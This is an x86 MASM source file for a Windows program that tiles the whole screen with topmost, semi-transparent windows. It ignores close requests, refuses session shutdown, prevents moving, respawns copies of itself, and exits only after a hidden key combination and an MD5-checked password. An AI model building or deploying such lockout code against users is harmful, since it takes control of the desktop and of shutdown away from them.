include main.inc
	
.code
start:
    call InitCommonControls
		push NULL
    call GetModuleHandle
    
    	push SW_SHOWNORMAL
    	push NULL
    	push NULL
    	push eax
    call WinMain
    
    	push eax
    call ExitProcess
WinMain proc hinst:HINSTANCE, pinst:HINSTANCE, nCmdLine:LPSTR, nCmdShow:DWORD
	local hwndMain:DWORD
    local pmsg:DWORD
    
    push hinst
    pop wc.hInstance
    
    		push IDC_ARROW
    		push NULL
    	call LoadCursor
    mov wc.hCursor, eax
    
    		push IDI_ICON1
    		push hinst
    	call LoadIcon
    mov wc.hIcon, eax
    mov wc.hIconSm, eax
    	push 0FF0000h
	call CreateSolidBrush
    mov wc.hbrBackground, eax
    
    mov wc.cbSize, SIZEOF WNDCLASSEX
    mov wc.style, CS_HREDRAW or CS_VREDRAW or CS_DBLCLKS
    	lea eax, WndProc
    mov wc.lpfnWndProc, eax
    mov wc.cbClsExtra, NULL
    mov wc.cbWndExtra, NULL
    mov wc.lpszMenuName, NULL
    mov wc.lpszClassName, offset ClassName
    
    		lea eax, wc
    	push eax
    call RegisterClassEx
    
    mov ax, ACCEL_ID1
    mov accel1.cmd, ax
    mov accel1.fVirt, FALT or FSHIFT or FCONTROL or FVIRTKEY
    mov accel1.key, VK_K
    
    mov ax, ACCEL_ID2
    mov accel2.cmd, ax
    mov accel2.fVirt, FALT or FSHIFT or FCONTROL or FVIRTKEY
    mov accel2.key, VK_S
    
    mov ax, ACCEL_ID3
    mov accel3.cmd, ax
    mov accel3.fVirt, FALT or FSHIFT or FCONTROL or FVIRTKEY
    mov accel3.key, VK_E
    
    mov ax, ACCEL_ID4
    mov accel4.cmd, ax
    mov accel4.fVirt, FALT or FSHIFT or FCONTROL or FVIRTKEY
    mov accel4.key, VK_B
    
    mov ax, ACCEL_ID5
    mov accel5.cmd, ax
    mov accel5.fVirt, FALT or FSHIFT or FCONTROL or FVIRTKEY
    mov accel5.key, VK_C
    
    	push 5
    		lea eax, accel1
    	push eax
    call CreateAcceleratorTable
    mov hAccelTable, eax
    
    	push SM_CYVIRTUALSCREEN
    call GetSystemMetrics
    mov ecx, BORG_MAX_RT
    xor edx, edx
    div ecx
    test edx, edx
    jz hEq
    	inc eax
    hEq:
    mov WND_HEIGHT, eax
    
    	push SM_CXVIRTUALSCREEN
    call GetSystemMetrics
    mov ecx, BORG_MAX_RT
    xor edx, edx
    div ecx
    test edx, edx
    jz wEq
    	inc eax
    wEq:
    mov WND_WIDTH, eax
	
		push NULL
		push hinst
		push NULL
		push NULL
		push WND_HEIGHT
		push WND_WIDTH
		push CW_USEDEFAULT
		push CW_USEDEFAULT
		push WS_POPUP
			lea eax, AppName
		push eax
			lea eax, ClassName
		push eax
		push WS_EX_LAYERED or WS_EX_TOPMOST or WS_EX_TOOLWINDOW
	call CreateWindowEx
	mov hwndMain, eax
	
    	push sizeof MSG
		push HEAP_ZERO_MEMORY
			call GetProcessHeap
		push eax
    call HeapAlloc
    mov pmsg, eax
    
	message_loop:
			push NULL
			push NULL
			push NULL
			push pmsg
        call GetMessage
        
        cmp eax, NULL
        je message_loop_end
        
        	push pmsg
        	push hAccelTable
        	push hwndMain
        call TranslateAccelerator
        
        cmp eax, TRUE
        je message_loop
        
			push pmsg
        call TranslateMessage
        
			push pmsg
        call DispatchMessage
        jmp message_loop
    message_loop_end:
	
    mov eax, pmsg
    push (MSG ptr [eax]).wParam
    
		push pmsg
		push HEAP_ZERO_MEMORY
			call GetProcessHeap
		push eax
	call HeapFree
	
	pop eax
    ret
WinMain endp
WndProc proc hwnd:HWND, msg:UINT, wp:WPARAM, lp:LPARAM
	local rct:RECT
	
	cmp msg, WM_CREATE
	je case_WM_CREATE
	
	cmp msg, WM_CTLCOLORSTATIC
	je case_WM_CTLCOLORSTATIC
	
	cmp msg, WM_COMMAND
	je case_WM_COMMAND
	
	cmp msg, WM_QUERYENDSESSION
	je case_WM_QUERYENDSESSION
	
	cmp msg, WM_MOVE
	je case_WM_MOVE
	
	cmp msg, WM_WINDOWPOSCHANGING
	je case_WM_WINDOWPOSCHANGING
	
	cmp msg, WM_LBUTTONUP
	je case_WM_LBUTTONUP
	
	cmp msg, WM_RBUTTONUP
	je case_WM_RBUTTONUP
	
;	cmp msg, WM_LBUTTONDBLCLK
;	je case_WM_LBUTTONDBLCLK
;	
;	cmp msg, WM_RBUTTONDBLCLK
;	je case_WM_RBUTTONDBLCLK
	
	cmp msg, WM_CLOSE
	je case_WM_CLOSE
	
	cmp msg, WM_DESTROY
	je case_WM_DESTROY
	
	mov eax, BORG_CISW
	cmp msg, eax
	je case_BORG_CISW
	
	mov eax, BORG_CISI
	cmp msg, eax
	je case_BORG_CISI
	
	mov eax, BORG_GAME
	cmp msg, eax
	je case_BORG_GAME
	
	mov eax, BORG_QUER
	cmp msg, eax
	je case_BORG_QUER
	
	mov eax, BORG_PRES
	cmp msg, eax
	je case_BORG_PRES
	
	mov eax, BORG_MOVD
	cmp msg, eax
	je case_BORG_MOVD
	
	mov eax, BORG_TERM
	cmp msg, eax
	je case_BORG_TERM
	
	jmp case_default
	
	case_WM_CREATE:
				lea eax, borgTerminate
			push eax
		call RegisterWindowMessage
		mov BORG_TERM, eax
				lea eax, borgQuery
			push eax
		call RegisterWindowMessage
		mov BORG_QUER, eax
				lea eax, borgPresent
			push eax
		call RegisterWindowMessage
		mov BORG_PRES, eax
				lea eax, borgMoved
			push eax
		call RegisterWindowMessage
		mov BORG_MOVD, eax
				lea eax, borgGame
			push eax
		call RegisterWindowMessage
		mov BORG_GAME, eax
				lea eax, borgCIsW
			push eax
		call RegisterWindowMessage
		mov BORG_CISW, eax
				lea eax, borgCIsI
			push eax
		call RegisterWindowMessage
		mov BORG_CISI, eax
		
				lea eax, szName
			push eax
			push cbMap
			push NULL
			push PAGE_READWRITE
			push NULL
			push INVALID_HANDLE_VALUE
		call CreateFileMapping
		mov hMapFile, eax
			
			push cbMap
			push NULL
			push NULL
			push FILE_MAP_ALL_ACCESS
			push hMapFile
		call MapViewOfFile
		mov pbMap, eax
		
					lea eax, rct
				push eax
				push hwnd
			call GetClientRect
			
			push NULL
			push wc.hInstance
			push dword ptr STATIC_ID
			push hwnd
			push 22
			push rct.right
				mov eax, rct.bottom
				xor edx, edx
				mov ecx, 2
				div ecx
				sub eax, 22
			push eax
			push 0
			push WS_CHILD or SS_CENTER
				lea eax, TheGame
			push eax
				lea eax, StaticClass
			push eax
			push NULL
		call CreateWindowEx
		
			push NULL
			push wc.hInstance
			push dword ptr EDIT_ID
			push hwnd
			push 22
				mov eax, rct.right
				sub eax, 50
			push eax
				mov eax, rct.bottom
				xor edx, edx
				mov ecx, 2
				div ecx
			push eax
			push 25
			push WS_CHILD or WS_BORDER or ES_CENTER
				lea eax, passCl
			push eax
				lea eax, EditClass
			push eax
			push NULL
		call CreateWindowEx
		
				lea ebx, EditProc
			push ebx
			push GWL_WNDPROC
			push eax
		call SetWindowLong
		mov editProc, eax
		
		xor edx, edx
		mov eax, hwnd
		mov ecx, 5000
		div ecx
		add edx, TIMER_MS
		mov TIMER_RAN, edx
		
			push SWP_NOMOVE or SWP_NOSIZE or SWP_NOSENDCHANGING
			push NULL
			push NULL
			push NULL
			push NULL
			push HWND_TOPMOST
			push hwnd
	    call SetWindowPos
	    	push FALSE
	    	push hwnd
	    call GetSystemMenu
	    push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
		push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
		push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
		push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
		push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
		push eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		pop eax
	    	push MF_BYPOSITION
	    	push 0
	    	push eax
		call RemoveMenu
		
				lea eax, TimerProc
			push eax
			push TIMER_MS
			push dword ptr TIMER_ID
			push hwnd
		call SetTimer

			push hwnd
			push 0
			push BORG_PRES
			push PBSM
			push BSF_POSTMESSAGE
		call BroadcastSystemMessage
		
			push LWA_ALPHA
			push 150
			push NULL
			push hwnd
		call SetLayeredWindowAttributes
		
			push NULL
			push NULL
			push NULL
			push NULL
			push NULL
			push NULL
			push NULL
			push NULL
			push hwnd
		call UpdateLayeredWindow
		
			push SW_SHOWNORMAL
			push hwnd
	    call ShowWindow
	    
	    	push hwnd
	    call UpdateWindow
	jmp case_end_msg
	
	case_WM_CTLCOLORSTATIC:
		xor eax, eax
		mov al, sTran
		shl eax, 16
		mov ah, sTran
		mov al, sTran
		not ax
			push eax
			push wp
		call SetTextColor
			push TRANSPARENT
			push wp
		call SetBkMode
		mov eax, wc.hbrBackground
		ret
	jmp case_default
	
	case_WM_COMMAND:
		mov eax, wp
		cmp ax, ACCEL_ID5
		je case_ACCEL_ID5
		
		cmp ax, EDIT_ID
		je case_EDIT_ID
		jmp case_non_com
		
		case_ACCEL_ID5:
				push 0
				push 0
				push BORG_CISW
				push PBSM
				push BSF_POSTMESSAGE
			call BroadcastSystemMessage
		jmp case_non_com
		
		case_EDIT_ID:
				push NULL
				push '*'
				push EM_SETPASSWORDCHAR
				push lp
			call SendMessage
		jmp case_non_com
		case_non_com:
		
		mov al, borgCommander
		cmp al, FALSE
		je case_end_msg
		
		mov eax, wp
		mov bl, accelFlags
		
		cmp ax, ACCEL_ID1
		je case_ACCEL_ID1
		
		cmp ax, ACCEL_ID2
		je case_ACCEL_ID2
		
		cmp ax, ACCEL_ID3
		je case_ACCEL_ID3
		
		cmp ax, ACCEL_ID4
		je case_ACCEL_ID4
		
		jmp case_end_com
		
		case_ACCEL_ID1:
			or bl, 1b
		jmp case_end_com
		
		case_ACCEL_ID2:
			or bl, 10b
		jmp case_end_com
		
		case_ACCEL_ID3:
			or bl, 100b
		jmp case_end_com
		
		case_ACCEL_ID4:
			or bl, 1000b
		jmp case_end_com
		
		case_end_com:
			mov accelFlags, bl
			cmp accelFlags, 0Fh
			jne case_end_msg
				mov accelFlags, NULL
					push dword ptr EDIT_ID
					push hwnd
				call GetDlgItem
				push eax
					push SW_SHOW
					push eax
				call ShowWindow
				pop eax
				push eax
					push eax
				call SetFocus
				pop eax
				push eax
					push -1
					push 0
					push EM_SETSEL
					push eax
				call SendMessage
				pop eax
					push NULL
					push NULL
					push EM_SETPASSWORDCHAR
					push eax
				call SendMessage
	jmp case_end_msg
	
	case_WM_QUERYENDSESSION:
	jmp case_end_msg
	
	case_WM_MOVE:
		mov borgMove, TRUE
	jmp case_end_msg
	
	case_WM_WINDOWPOSCHANGING:
		mov eax, lp
		mov edx, (WINDOWPOS ptr [eax]).flags
		or edx, SWP_NOMOVE
		mov (WINDOWPOS ptr [eax]).flags, edx
	jmp case_end_msg
	
	case_WM_LBUTTONUP:
	case_WM_RBUTTONUP:
    	cmp gamed, TRUE
    	je isGamed1
			push 0
			push 0
			push BORG_GAME
			push PBSM
			push BSF_POSTMESSAGE
		call BroadcastSystemMessage
    	isGamed1:
	jmp case_end_msg
	
;	case_WM_LBUTTONDBLCLK:
;		call AllocConsole
;	    		lea eax, bHashStr
;	    	push eax
;	    		lea eax, pass
;	    	push eax
;	    call Hash
;				lea eax, bHashStr
;			push eax
;		call SetConsoleTitle
;			push STD_OUTPUT_HANDLE
;		call GetStdHandle
;			push NULL
;			push NULL
;			push 32
;				lea ebx, bHashStr
;			push ebx
;			push eax
;		call WriteFile
;	jmp case_end_msg
;	
;	case_WM_RBUTTONDBLCLK:
;		call FreeConsole
;	jmp case_end_msg
	
	case_WM_CLOSE:
    jmp case_end_msg
    
    case_WM_DESTROY:
    jmp case_end_msg
    
    ;Borg Messages
    case_BORG_CISW:
    	cmp borgCommander, TRUE
    	jne case_end_msg
				push hwnd
				push 0
				push BORG_CISI
				push PBSM
				push BSF_POSTMESSAGE
			call BroadcastSystemMessage
    jmp case_end_msg
    
    case_BORG_CISI:
				push lp
			call SetForegroundWindow
    jmp case_end_msg
    
    case_BORG_GAME:
    	cmp gamed, TRUE
    	je isGamed2
    		mov sTran, 05h
    				lea eax, StaticTimerProc
    			push eax
    			push 50
    			push dword ptr STIMER_ID
	    				push dword ptr STATIC_ID
	    				push hwnd
	    			call GetDlgItem
	    		push eax
	    					push eax
						push SW_SHOW
						push eax
					call ShowWindow
							pop eax
	    				push TRUE
	    				push NULL
	    				push eax
	    			call InvalidateRect
    		call SetTimer
    	mov gamed, TRUE
    	isGamed2:
    jmp case_end_msg
    
    case_BORG_QUER:
    		push dword ptr TIMER_ID
    		push hwnd
    	call KillTimer
    	xor eax, eax
    	mov al, borgCommander
    	cmp al, TRUE
    	je isCommander
    	jmp notCommander
    	isCommander:
	    	mov eax, borgPresence
	    	cmp eax, BORG_MAX
	    	jge borgAllUp
	    	jl borgNotAllUp
	    	borgAllUp:
	    		jmp borgEnd
	    	borgNotAllUp:
	    		mov ecx, BORG_MAX
	    		sub ecx, borgPresence
	    		createBorg:
		    		push ecx
		    			push pprin
		    			push pstin
		    			push NULL
		    			push NULL
		    			push NULL
		    			push FALSE
		    			push NULL
		    			push NULL
							call GetCommandLine
		    			push eax
		    			push NULL
		    		call CreateProcess
		    			push prin.hProcess
		    		call CloseHandle
		    			push prin.hThread
		    		call CloseHandle
		    		pop ecx
	    		loop createBorg
	    		jmp borgEnd
	    	borgEnd:
	    notCommander:
	    
				lea eax, TimerProc
			push eax
    	mov eax, hwnd
    	cmp eax, lp
    	je hwndEqual
    	jmp hwndNotEqual
    	hwndNotEqual:
    		mov borgCommander, FALSE
    				lea eax, AppName
    			push eax
    			push hwnd
    		call SetWindowText
				push TIMER_RAN
			jmp hwndEnd
		hwndEqual:
    		mov borgCommander, TRUE
    				lea eax, AppNameUp
    			push eax
    			push hwnd
    		call SetWindowText
				push PTIMER_MS
			jmp hwndEnd
		hwndEnd:
			push dword ptr TIMER_ID
			push hwnd
		call SetTimer
		
		mov borgMoveAll, FALSE
		cmp borgMoveTemp, TRUE
		jne falseBorgMove
	    	mov eax, borgPresence
	    	cmp eax, BORG_MAX
	    	jne falseBorgMove
				mov borgMoveAll, TRUE
				mov borgMoveTemp, FALSE
		jmp falseBorgMove
		falseBorgMove:
		
    	mov borgPresence, NULL
    	mov moveWindowID, NULL
			push hwnd
				xor eax, eax
				mov al, borgMove
			push eax
			push BORG_PRES
			push PBSM
			push BSF_POSTMESSAGE
		call BroadcastSystemMessage
    jmp case_end_msg
    
    case_BORG_PRES:
    	cmp borgCommander, NULL
    	je noUpdate
		    cmp borgMoveAll, NULL
		    je dontMove
		    	mov eax, moveWindowID
				mov ecx, BORG_MAX_RT
				xor edx, edx
				div ecx
				
				mov ebx, edx
				
				mov ecx, WND_HEIGHT
				mul ecx
				
				mov ecx, eax
				mov eax, ebx
				mov ebx, ecx
				
				mov ecx, WND_WIDTH
				mul ecx
		    		
					push SWP_NOSIZE or SWP_NOSENDCHANGING
					push NULL
					push NULL
					push ebx
					push eax
					push HWND_TOPMOST
					push lp
			    call SetWindowPos
			    	push NULL
			    	push NULL
			    	push BORG_MOVD
			    	push lp
			    call PostMessage
				mov borgMoveTemp, FALSE
				jmp noUpdate
			dontMove:
			cmp wp, TRUE
			jne noUpdate
				mov borgMoveTemp, TRUE
			noUpdate:
	    inc moveWindowID
    	inc borgPresence
    	mov eax, borgPresence
    	cmp eax, BORG_MAX
    	jle case_end_msg
		    	push NULL
		    	push NULL
		    	push BORG_TERM
		    	push lp
		    call PostMessage    	
    jmp case_end_msg
    
    case_BORG_MOVD:
    	mov borgMove, FALSE
    jmp case_end_msg
    
    case_BORG_TERM:
    		push cbMap
    		push pbMap
    			lea eax, passBuff
    		push eax
    	call lstrcpyn
    	    	lea eax, bHashStr
	    	push eax
	    		lea eax, passBuff
	    	push eax
	    call Hash

				lea eax, bHashStr
				lea ebx, pass
			push ebx
			push eax
		call StringsEqual
		
		test eax, eax
		jz passBad
    
    		push dword ptr TIMER_ID
    		push hwnd
    	call KillTimer
    				push dword ptr STATIC_ID
    				push hwnd
    			call GetDlgItem
    		push dword ptr STIMER_ID
    		push eax
    	call KillTimer
    		push pbMap
    	call UnmapViewOfFile
    		push hMapFile
    	call CloseHandle
    		push hAccelTable
    	call DestroyAcceleratorTable
	    	push wc.hbrBackground
	    call DeleteObject
    		push hwnd
    	call DestroyWindow
			push NULL
    	call PostQuitMessage
    	passBad:
    jmp case_end_msg

    case_default:
    		push lp
    		push wp
    		push msg
    		push hwnd
    	call DefWindowProc
    ret
        
    case_end_msg:
    	xor eax, eax
    ret
WndProc endp
TimerProc proc hwnd:HWND, msg:UINT, id:UINT, time:DWORD
			push hwnd
			push 0
			push BORG_QUER
			push PBSM
			push BSF_POSTMESSAGE
		call BroadcastSystemMessage
	ret
TimerProc endp
StaticTimerProc proc hwnd:HWND, msg:UINT, id:UINT, time:DWORD
		cmp sTran, 0FFh
		jne sDec
		jmp sDone
		sDec:
			add sTran, 10
				push TRUE
				push NULL
				push hwnd
			call InvalidateRect
		jmp sEnd
		sDone:
				push SW_HIDE
				push hwnd
			call ShowWindow
				push dword ptr STIMER_ID
				push hwnd
			call KillTimer
			mov gamed, FALSE
		jmp sEnd
		sEnd:
	ret
StaticTimerProc endp
EditProc proc hwnd:HWND, msg:UINT, wp:WPARAM, lp:LPARAM
	cmp msg, WM_KEYDOWN
	je case_WM_KEYDOWN
	jmp case_def_edit
	
	case_WM_KEYDOWN:
		mov eax, wp
		cmp eax, VK_RETURN
		jne case_def_edit
			push SW_HIDE
			push hwnd
		call ShowWindow
				lea eax, passBuff
			push eax
			push 20
			push WM_GETTEXT
			push hwnd
		call SendMessage
				lea eax, passCl
			push eax
			push NULL
			push WM_SETTEXT
			push hwnd
		call SendMessage

	    		lea eax, bHashStr
	    	push eax
	    		lea eax, passBuff
	    	push eax
	    call Hash

				lea eax, bHashStr
				lea ebx, pass
			push ebx
			push eax
		call StringsEqual
		
		test eax, eax
		jz passBad
		
		passGood:
				push cbMap
					lea eax, passBuff
				push eax
				push pbMap
			call lstrcpyn
				push 0
				push 0
				push BORG_TERM
				push PBSM
				push BSF_POSTMESSAGE
			call BroadcastSystemMessage
			jmp passEnd
		passBad:
			mov borgMove, TRUE
			jmp passEnd
		passEnd:
		
	jmp case_end_edit
		
	case_def_edit:
			push lp
			push wp
			push msg
			push hwnd
			push editProc
		call CallWindowProc
		ret
	case_end_edit:
		xor eax, eax
		ret
EditProc endp
StringsEqual proc str1:DWORD, str2:DWORD
			push str1
		call StringLength
		mov ecx, eax
		mov edi,str1
		mov esi,str2
		repe cmps byte ptr [edi], byte ptr [esi]
		pushfd
		pop eax
		shr eax, 6
		and eax, 1
	ret
StringsEqual endp
StringLength proc str1:DWORD
		mov ecx, 0FFFFFFFFh
		mov al, NULL
		mov edi,str1
		repne scas byte ptr [edi]
		mov eax, 0FFFFFFFFh
		sub eax, ecx
	ret
StringLength endp
Hash proc pStr:DWORD, pbHashStr:DWORD
	local hProv:DWORD
	local hHash:DWORD
	local cbHash:DWORD
	local bDigits[16]:BYTE
	local bHash[16]:BYTE
	
	;init variables
	mov hProv, NULL
	mov hHash, NULL
	mov cbHash, 16
	mov bDigits[0], '0'
	mov bDigits[1], '1'
	mov bDigits[2], '2'
	mov bDigits[3], '3'
	mov bDigits[4], '4'
	mov bDigits[5], '5'
	mov bDigits[6], '6'
	mov bDigits[7], '7'
	mov bDigits[8], '8'
	mov bDigits[9], '9'
	mov bDigits[10], 'a'
	mov bDigits[11], 'b'
	mov bDigits[12], 'c'
	mov bDigits[13], 'd'
	mov bDigits[14], 'e'
	mov bDigits[15], 'f'
	mov bHash[0], NULL
	mov bHash[1], NULL
	mov bHash[2], NULL
	mov bHash[3], NULL
	mov bHash[4], NULL
	mov bHash[5], NULL
	mov bHash[6], NULL
	mov bHash[7], NULL
	mov bHash[8], NULL
	mov bHash[9], NULL
	mov bHash[10], NULL
	mov bHash[11], NULL
	mov bHash[12], NULL
	mov bHash[13], NULL
	mov bHash[14], NULL
	mov bHash[15], NULL
	
		push CRYPT_VERIFYCONTEXT
		push PROV_RSA_FULL
		push NULL
		push NULL
			lea eax, hProv
		push eax
	call CryptAcquireContext
	
			lea eax, hHash
		push eax
		push NULL
		push NULL
		push 32771
		push hProv
	call CryptCreateHash
	
		push pStr
	call StringLength
	dec eax
		
		push NULL
		push eax
		push pStr
		push hHash
	call CryptHashData
		
		push NULL
			lea eax, cbHash
		push eax
			lea eax, bHash
		push eax
		push HP_HASHVAL
		push hHash
	call CryptGetHashParam
	mov ecx, NULL
	hashBuff:
		mov al, bHash[ecx]
		mov bl, bHash[ecx]
		and eax, 0f0h
		and ebx, 00fh
		shr eax, 4
		mov al, bDigits[eax]
		mov bl, bDigits[ebx]
		mov edx, pbHashStr
		mov byte ptr [edx + ecx * 2], al
		mov byte ptr [edx + ecx * 2 + 1], bl
	inc ecx
	cmp ecx, cbHash
	jne hashBuff
	mov byte ptr [edx + ecx * 2], NULL
		push hHash
	call CryptDestroyHash
		push NULL
		push hProv
	call CryptReleaseContext
	ret
Hash endp
end start